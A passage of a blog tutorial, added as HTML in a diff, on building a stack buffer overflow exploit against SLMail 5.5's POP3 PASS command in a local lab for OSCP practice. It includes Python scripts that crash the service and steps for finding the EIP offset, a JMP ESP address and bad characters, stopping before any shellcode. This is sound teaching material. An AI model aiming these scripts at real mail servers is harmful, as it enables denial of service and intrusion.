@@ -1,0 +1,1186 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <script type="application/ld+json">
+
+{  
+  "@context":"http://schema.org",
+  "@type":"Website",
+  "@id":"https:\/\/succurity.com\/",
+  "author": {
+    "@type": "Person",
+    "name": "Sage",
+    
+    "image": "https://succurity.com/images/me.jpg"
+    
+  },
+  "name":"Sage\x27s Succurity Blog",
+  "description":"\x3cp\x3eSLMail is an awesome choice of software to easily practice creating and exploiting buffer overflows. If you need to practice Buffer Overflows for your OSCP, then hopefully this tutorial can help you.\x3c\/p\x3e",
+  "url":"https:\/\/succurity.com\/post\/offsec\/intro-to-buffer-overflows\/",
+  "keywords":"[security]"
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.68.3 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="Sage">
+<meta name="keywords" content="security">
+<meta name="description" content="SLMail is an awesome choice of software to easily practice creating and exploiting buffer overflows. If you need to practice Buffer Overflows for your OSCP, then hopefully this tutorial can help you.">
+
+
+<meta property="og:description" content="SLMail is an awesome choice of software to easily practice creating and exploiting buffer overflows. If you need to practice Buffer Overflows for your OSCP, then hopefully this tutorial can help you.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Intro to Buffer Overflows">
+<meta name="twitter:title" content="Intro to Buffer Overflows">
+<meta property="og:url" content="https://succurity.com/post/offsec/intro-to-buffer-overflows/">
+<meta property="twitter:url" content="https://succurity.com/post/offsec/intro-to-buffer-overflows/">
+<meta property="og:site_name" content="Sage&#39;s Succurity Blog">
+<meta property="og:description" content="SLMail is an awesome choice of software to easily practice creating and exploiting buffer overflows. If you need to practice Buffer Overflows for your OSCP, then hopefully this tutorial can help you.">
+<meta name="twitter:description" content="SLMail is an awesome choice of software to easily practice creating and exploiting buffer overflows. If you need to practice Buffer Overflows for your OSCP, then hopefully this tutorial can help you.">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2020-02-16T11:46:59">
+  
+  
+    <meta property="article:modified_time" content="2020-02-16T11:46:59">
+  
+  
+  
+    
+      <meta property="article:section" content="Offsec">
+    
+  
+  
+    
+      <meta property="article:tag" content="Offensive Security">
+    
+      <meta property="article:tag" content="OSCP">
+    
+      <meta property="article:tag" content="Buffer Overflows">
+    
+      <meta property="article:tag" content="Pentesting">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://succurity.com/images/me.jpg">
+  <meta property="twitter:image" content="https://succurity.com/images/me.jpg">
+
+
+
+
+  <meta property="og:image" content="https://succurity.com/images/Offsec/BufferOverflow/banner.png">
+  <meta property="twitter:image" content="https://succurity.com/images/Offsec/BufferOverflow/banner.png">
+
+
+
+    <title>Intro to Buffer Overflows</title>
+
+    <link rel="icon" href="https://succurity.com/images/favicon.ico">
+    
+
+    
+
+    <link rel="canonical" href="https://succurity.com/post/offsec/intro-to-buffer-overflows/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://succurity.com/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://succurity.com/" aria-label="Go to homepage">Sage&#39;s Succurity Blog</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://twitter.com/misusage_" target="_blank" rel="noopener" aria-label="Open the link: https://twitter.com/misusage_">
+    
+    
+    
+      
+        <img class="header-picture" src="https://succurity.com/images/me.jpg" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://succurity.com/#about" aria-label="Read more about the author">
+          <img class="sidebar-profile-picture" src="https://succurity.com/images/me.jpg" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Sage</h4>
+        
+          <h5 class="sidebar-profile-bio">Succurity through Obscurity usually isn&rsquo;t a good idea.</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/categories/write-ups" title="CTF Writeups">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">CTF Writeups</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/page/about" title="About Me">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/silverlak3" target="_blank" rel="noopener" title="GitHub">
+    
+      <i class="sidebar-button-icon fab fa-lg fa-github" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.linkedin.com/in/rafasec/" target="_blank" rel="noopener" title="LinkedIn">
+    
+      <i class="sidebar-button-icon fab fa-lg fa-linkedin" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">LinkedIn</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://twitter.com/misusage_" target="_blank" rel="noopener" title="Twitter">
+    
+      <i class="sidebar-button-icon fab fa-lg fa-twitter" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-left
+              post-header-cover--partial"
+       style="background-image:url('/images/Offsec/BufferOverflow/banner.png')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title">
+      Intro to Buffer Overflows
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2020-02-16T11:46:59-08:00">
+        
+  February 16, 2020
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://succurity.com/categories/offsec">Offsec</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <p>SLMail is an awesome choice of software to easily practice creating and exploiting buffer overflows. If you need to practice Buffer Overflows for your OSCP, then hopefully this tutorial can help you.</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h2 id="setup">Setup</h2>
+<!-- raw HTML omitted -->
+<p>This is my current setup:</p>
+<ul>
+<li>Mac OSX 10.15.3</li>
+<li>Windows 7 SP1 VM (Updated on Feb 17, <em>yes I know EOL</em>)</li>
+<li>Kali 2019.3 VM (I forgot to update to 2020.1)</li>
+<li>VMWare Fusion 11.5.1</li>
+</ul>
+<p>In the Windows 7 VM, install the following:</p>
+<ul>
+<li><a href="https://www.immunityinc.com/products/debugger/">Immunity Debugger</a></li>
+<li><a href="https://github.com/corelan/mona">mona.py</a></li>
+<li>SLMail 5.5 - You can download the software directly from <a href="https://www.exploit-db.com/exploits/638">Exploit-DB</a></li>
+</ul>
+<p>Make sure you update your Windows 7 box. I ran into so many issues because of this. Update, get it out of the way, then continue with the software installs. Once that is complete, install and open Immunity to make sure everything is running properly. With SLMail, just hit next on every prompt and accept all the defaults. With mona, just move the mona.py script over to <code>C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands</code> folder.</p>
+<p>The last two things you should do is switch the networking adapter to Local Only, and turn off the Windows Firewall.</p>
+<!-- raw HTML omitted -->
+<h2 id="establishing-connectivity">Establishing Connectivity</h2>
+<!-- raw HTML omitted -->
+<p>From my main host (Mac OSX - IP is 192.168.60.1), I&rsquo;ll establish a connection to SLMail which is running on port 110. <code>nc -v 192.168.60.128 110</code>
+<img src="https://succurity.com/images/Offsec/BufferOverflow/one.png" alt="Establishing Connectivity"></p>
+<p>Let&rsquo;s start. Create a basic python script to help us automate the connection process. This template code is what we will be tweaking to eventually create our final exploit.
+
+
+  
+  
+  
+  
+  
+
+
+  
+    
+  
+  
+
+<figure class="codeblock codeblock--tabbed">
+  <figcaption>
+    
+      <span>poc.py</span>
+    
+    <ul class="tabs">
+      
+        <li class="tab active">python</li>
+      
+    </ul>
+  </figcaption>
+  <div class="tabs-content">
+    
+      
+      <figure class="highlight language-python python" style="display: block;">
+        <table>
+          <tbody>
+            <tr>
+              <td class="gutter">
+                <pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></pre>
+              </td>
+              <td class="code">
+                <pre class="code-highlight language-python python"><code class="python">#!/usr/bin/python
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+    print&#34;\nConnecting...&#34;
+    s.connect((&#39;192.168.60.128&#39;, 110))
+    data = s.recv(1024)
+    s.send(&#39;USER username &#39; &#43; &#39;\r\n&#39;)
+    data = s.recv(1024)
+    s.send(&#39;PASS password &#39; &#43; &#39;\r\n&#39;)
+    data = s.recv(1024)
+    s.close()
+    print&#34;\nDone!&#34;
+except:
+    print &#34;Could not connect to POP3...&#34;</code></pre>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </figure>
+    
+  </div>
+</figure>
+</p>
+<p>Don&rsquo;t forget to make it executable and run it.
+<img src="https://succurity.com/images/Offsec/BufferOverflow/two.png" alt="Establishing Connectivity with our python script"></p>
+<!-- raw HTML omitted -->
+<h2 id="fuzzing">Fuzzing</h2>
+<!-- raw HTML omitted -->
+<p>Now onto the next step. We will now starting <em>fuzzing</em> the application. Fuzzing is the process in which we throw random or unexpected data to the application in an attempt to crash it. Although you can use different tools and techniques for this process, for now we will simply throw <em>about 2000</em> A&rsquo;s (x41 in Hexadecimal) to SLMail. Also in the real world, don&rsquo;t expect to find something right away. Fuzzing is an art and it can take a long time to find something, if anything at all. With SLMail, the title of the Exploit-DB page kinda gives away the vulnerable parameter <em>&ldquo;Seattle Lab Mail (SLmail) 5.5 - POP3 &lsquo;PASS&rsquo; Remote Buffer Overflow&rdquo;</em>, giving us the correct path to take.</p>
+<p>So now, instead of sending the &ldquo;password&rdquo; in the PASS parameter, we will modify our exploit template to send the 2000 A&rsquo;s instead.</p>
+
+
+  
+  
+  
+  
+  
+
+
+  
+    
+  
+  
+
+<figure class="codeblock codeblock--tabbed">
+  <figcaption>
+    
+      <span>poc.py</span>
+    
+    <ul class="tabs">
+      
+        <li class="tab active">python</li>
+      
+    </ul>
+  </figcaption>
+  <div class="tabs-content">
+    
+      
+      <figure class="highlight language-python python" style="display: block;">
+        <table>
+          <tbody>
+            <tr>
+              <td class="gutter">
+                <pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></pre>
+              </td>
+              <td class="code">
+                <pre class="code-highlight language-python python"><code class="python">#!/usr/bin/python
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+buffer = &#34;\x41&#34; * 2000
+
+try:
+    print&#34;\nConnecting...&#34;
+    s.connect((&#39;192.168.60.128&#39;, 110))
+    data = s.recv(1024)
+    s.send(&#39;USER username &#39; &#43; &#39;\r\n&#39;)
+    data = s.recv(1024)
+    s.send(&#39;PASS &#39;&#43; buffer &#43; &#39;\r\n&#39;)
+    data = s.recv(1024)
+    s.close()
+    print&#34;\nDone!&#34;
+except:
+    print &#34;Could not connect to POP3...&#34;</code></pre>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </figure>
+    
+  </div>
+</figure>
+
+<p>Now let&rsquo;s open Immunity to start the debug process. Since SLMail is running as Administrator, we will have to do the same with Immunity. Right click on the desktop icon, click on <em>&ldquo;Run as administrator&rdquo;</em>, accept the UAC prompt, and now attach the SLmail.exe process under <em>File &gt; Attach</em>. Once it attaches, it will pause the process so hit <em>F9</em> or <em>Debug &gt; Run</em> to resume SLMail.</p>
+<p><img src="https://succurity.com/images/Offsec/BufferOverflow/three.png" alt="Attaching SLMail Process"></p>
+<p>Make your modifications to the exploit template and launch your script. If you sent the 2000 A&rsquo;s, the app won&rsquo;t crash. The reason for this is that the exact size of the buffer that holds the PASS variable is unbeknownst to us, so we will have to keep throwing more A&rsquo;s at SLMail until it crashes. Increase it to 3000 and run it again. This time, it will crash. We know it has crashed because the EIP register will be filled with 41&rsquo;s and it will say &ldquo;Paused&rdquo; in the bottom right hand corner.</p>
+<p><img src="https://succurity.com/images/Offsec/BufferOverflow/four.png" alt="Crashing the App"></p>
+<p>Why did SLMail crash/seg-fault? Well, since we threw in 3000 A&rsquo;s into the buffer, it was more data than what the buffer could hold and the program itself didn&rsquo;t have any exceptions to catch this. In turn, it also changed the EIP (instruction pointer) which is what the CPU uses to point to the next instruction. Since 41414141 is not a valid address to an instruction, the application crashes.</p>
+<p>Sweet. Now we know that our buffer size is somewhere between 2000 and 3000 bytes. Let&rsquo;s restart the app and try some mona tricks to find that exact amount.</p>
+<p><em>NOTE: I could not figure out how to restart the app manually so for the time being, I would just bounce (restart) the VM and relaunch Immunity.</em></p>
+<!-- raw HTML omitted -->
+<h2 id="pattern-creation-with-mona">Pattern Creation with Mona</h2>
+<!-- raw HTML omitted -->
+<p>With Mona, if you ever need the help menu, just type: <code>!mona help</code>
+<img src="https://succurity.com/images/Offsec/BufferOverflow/five.png" alt="Working with Mona"></p>
+<p>Before anything, let&rsquo;s get our working folder setup. Create a new folder under the C drive as <code>C:\BufferOverflow\</code> then run the following command: <code>!mona config -set workingfolder C:\BufferOverflow\%p</code>. This make all the output from mona appear in that folder. The <code>%p</code> tells mona to create a new sub-folder named after the current application that is being debugged.</p>
+<p>Now run: <code>!mona pc 3000</code> or <code>!mona pattern_create 3000</code></p>
+<p>After we run that command, there will be a new file called <code>pattern.txt</code>. This creates a unique ASCII string that is 3000 bytes in size. Copy the ASCII chars from that file into the poc code and set that as the buffer you pass into the &lsquo;PASS&rsquo; parameter.</p>
+
+
+  
+  
+  
+  
+  
+
+
+  
+    
+  
+  
+
+<figure class="codeblock codeblock--tabbed">
+  <figcaption>
+    
+      <span>poc.py</span>
+    
+    <ul class="tabs">
+      
+        <li class="tab active">python</li>
+      
+    </ul>
+  </figcaption>
+  <div class="tabs-content">
+    
+      
+      <figure class="highlight language-python python" style="display: block;">
+        <table>
+          <tbody>
+            <tr>
+              <td class="gutter">
+                <pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></pre>
+              </td>
+              <td class="code">
+                <pre class="code-highlight language-python python"><code class="python">#!/usr/bin/python
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+buffer = &#34;\x41&#34; * 3000
+
+pattern = &#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9&#34;
+
+try:
+    print&#34;\nConnecting...&#34;
+    s.connect((&#39;192.168.60.128&#39;, 110))
+    data = s.recv(1024)
+    s.send(&#39;USER username &#39; &#43; &#39;\r\n&#39;)
+    data = s.recv(1024)
+    s.send(&#39;PASS &#39;&#43; pattern &#43; &#39;\r\n&#39;)
+    data = s.recv(1024)
+    s.close()
+    print&#34;\nDone!&#34;
+except:
+    print &#34;Could not connect to POP3...&#34;</code></pre>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </figure>
+    
+  </div>
+</figure>
+
+<p>Now run the poc code. As before, the application should crash, but this time we will have a new value in the EIP register. In this case, the resulting value is <code>39694438</code>.
+<img src="https://succurity.com/images/Offsec/BufferOverflow/six.png" alt="EIP Value"></p>
+<p>Now let&rsquo;s use mona to find the pattern offset. There are two commands you can use: <code>!mona pattern_offset 0x39694438</code> which results in:
+<img src="https://succurity.com/images/Offsec/BufferOverflow/seven.png" alt="EIP Value - Pattern_Offset"></p>
+<p>Or do <code>!mona findmsp</code>:
+<img src="https://succurity.com/images/Offsec/BufferOverflow/eight.png" alt="EIP Value - findmsp"></p>
+<p>Voila! <code>2606 bytes</code> is the size of the buffer. Another useful tip to know, which will come in handy later, is that the ESP (stack pointer) is at 2610 bytes. Why is this important well&hellip;</p>
+<!-- raw HTML omitted -->
+<h2 id="the-importance-of-controlling-registers">The Importance of Controlling Registers.</h2>
+<!-- raw HTML omitted -->
+<p>A quick review first.</p>
+<p>EIP - It is the instruction pointer. It holds the address of the first byte of the next instruction to be executed.</p>
+<p>ESP - It is the stack pointer. It holds the address of the most-recently pushed value on the stack.</p>
+<p>Shellcode - Machine code or assembly instructions put into hex that tell the host to do whatever you want. Its typically called <!-- raw HTML omitted -->shell<!-- raw HTML omitted -->code because it will spawn a shell. There are typically two kinds of shells, reverse shells and bind shells. In a bindshell, it means that the host is binding the network interface to a port of your choosing, or the shell is listening locally. In a reverse shell, the host starts the egress network connection <em>back</em> to your machine, where you would be listening for that connection to come in. <a href="https://en.wikipedia.org/wiki/Shellcode">Wikipedia - Shellcode</a></p>
+<p>Well, we know exactly where the program crashes and we have full control over the contents in the registers. Why is this useful? Well, <em>what if</em> we were to push some shellcode onto the stack, and <em>what if</em> we were to put a legitimate address into the EIP register that, lets say, contained the instruction to jump over to the address held the stack pointer and run our beautiful shellcode? Too confusing? In other words, we are now telling the application to stop it&rsquo;s normal execution and run <em>our</em> own code.</p>
+<p>This is one of the reasons why we have to be so precise. We have to send the maximum length of bytes to the PASS parameter, 4 bytes for the EIP address (<em>which again, is the instruction to jump to the ESP register</em>), a small NOP sled (<em>we will cover that soon</em>), and our shellcode after 2610 bytes.</p>
+<p>Now that we have that bit of information, let&rsquo;s continue.</p>
+<!-- raw HTML omitted -->
+<h2 id="finding-a-jmp-esp-instruction">Finding a JMP ESP Instruction</h2>
+<!-- raw HTML omitted -->
+<p>The next thing we have to do is find a JMP ESP instruction. Mona facilitates this process.</p>
+<p>You can do: <code>!mona jmp -r ESP</code> but this gives us no result.
+<img src="https://succurity.com/images/Offsec/BufferOverflow/nine.png" alt="Mona - Find JMP ESP"></p>
+<p>Or you can do: <code>!mona modules</code>, find a DLL that has little to no buffer overflow protections.
+<img src="https://succurity.com/images/Offsec/BufferOverflow/nineA.png" alt="Mona - Find a Vulnerable DLL">
+then do: <code>!mona find -s &quot;\xff\xe4&quot; -m SLMFC.DLL</code>. FFE4 is the machine code for the <strong>JMP ESP</strong> instruction and SLMFC is a DLL that is part of the SLMail program.
+<img src="https://succurity.com/images/Offsec/BufferOverflow/nineB.png" alt="Mona - Find a JMP Instruction"></p>
+<p>And this does give us a result. <code>0x5F4A358F</code> is an address in the DLL that contains the JMP ESP instruction. Convert it to little endian like so: <code>\x8F\x35\x4A\x5F</code> and add that to the poc code after our 2606 &ldquo;\x41&rdquo;&lsquo;s. <em>In the screenshot above, look at the first entry under the [+] Results :</em></p>
+<!-- raw HTML omitted -->
+<h2 id="finding-the-bad-chars">Finding the Bad Chars</h2>
+<!-- raw HTML omitted -->
+<p>The next step before we generate our shellcode is to find all the bad characters. These are chars that will make our shellcode stop working. To do this, you can use mona to generate an array of bytes starting from 0x00 and ending in 0xFF: <code>!mona bytearray</code></p>
+<p>Go into the newly created file in our working folder and copy the array into your poc code. Don&rsquo;t copy from the log window itself. You can remove <code>0x0A</code> and <code>0x0D</code>. These are the newline and carriage return hex values. These typically are caught as bad chars. I personally also remove <code>0x00</code> as this is the null char.</p>
+<p>
+
+  
+  
+  
+  
+  
+
+
+  
+    
+  
+  
+
+<figure class="codeblock codeblock--tabbed">
+  <figcaption>
+    
+      <span>poc.py</span>
+    
+    <ul class="tabs">
+      
+        <li class="tab active">python</li>
+      
+    </ul>
+  </figcaption>
+  <div class="tabs-content">
+    
+      
